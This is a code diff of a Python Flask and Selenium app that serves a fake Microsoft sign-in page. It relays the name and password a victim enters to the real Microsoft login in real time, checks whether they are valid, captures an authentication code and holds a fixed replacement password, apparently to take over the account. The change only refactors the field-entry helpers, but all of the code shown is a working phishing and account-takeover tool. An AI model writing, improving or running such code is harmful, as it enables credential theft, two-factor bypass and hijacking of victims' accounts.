@@ -12,7 +12,7 @@ from selenium.webdriver.common.keys import Keys
 import os
 
 def WEB_DRIVER_NAME(): return "geckodriver.exe"
-def NEW_PASSWORD(): return "aaaaaaaa"
+def NEW_PASSWORD(): return "a" * 8
 def WEB_DRIVER_PATH(): return os.path.join(os.getcwd(), WEB_DRIVER_NAME())
 def WEB_DRIVER_SERVICE(): return Service(executable_path = WEB_DRIVER_PATH())
 
@@ -52,35 +52,26 @@ def get_authentication_code():
         except:
             return False
 
-def fill_password(password):
-    PASSWORD_FIELD = WebDriverWait(DRIVER, 60).until(EC.visibility_of_element_located((By.NAME, "passwd")))
+def enter_field(field_name, value, error_id, clear=True):
+    field = WebDriverWait(DRIVER, 60).until(EC.visibility_of_element_located((By.NAME, field_name)))
 
-    PASSWORD_FIELD.send_keys(password)
-    PASSWORD_FIELD.send_keys(Keys.RETURN)
+    field.send_keys(value, Keys.RETURN)
 
     try:
-        PASSWORD_ERROR = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, "passwordError")))
-        print("\n" + PASSWORD_ERROR.text)
+        error = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, error_id)))
+        if clear:
+            field.clear()
         return False
 
     except:
         return True
 
-def fill_name(name):
-    EMAIL_FIELD = WebDriverWait(DRIVER, 60).until(EC.visibility_of_element_located((By.NAME, "loginfmt")))
+def enter_password(password):
+    return enter_field("passwd", password, "passwordError", False)
 
-    EMAIL_FIELD.send_keys(name)
-    EMAIL_FIELD.send_keys(Keys.RETURN)
-
-    try:
-        USERNAME_ERROR = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, "usernameError")))
-        print("\n" + USERNAME_ERROR.text)
-        EMAIL_FIELD.clear()
-        return False
-
-    except:
-        return True
-
+def enter_name(name):
+    return enter_field("loginfmt", name, "usernameError")
+    
 @app.route("/")
 def index():
     if "name" not in session or "password" not in session or not password_changed:
@@ -110,12 +101,12 @@ def login():
         return redirect(url_for("index"))
 
     elif "name" not in session and name_form.validate_on_submit():
-        if fill_name(name_form.name.data):
+        if enter_name(name_form.name.data):
             session["name"] = name_form.name.data
             return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", form=password_form)
 
     elif "name" in session and password_form.validate_on_submit():
-        if fill_password(password_form.password.data):
+        if enter_password(password_form.password.data):
             session["password"] = password_form.password.data
 
             authentication_code = get_authentication_code()
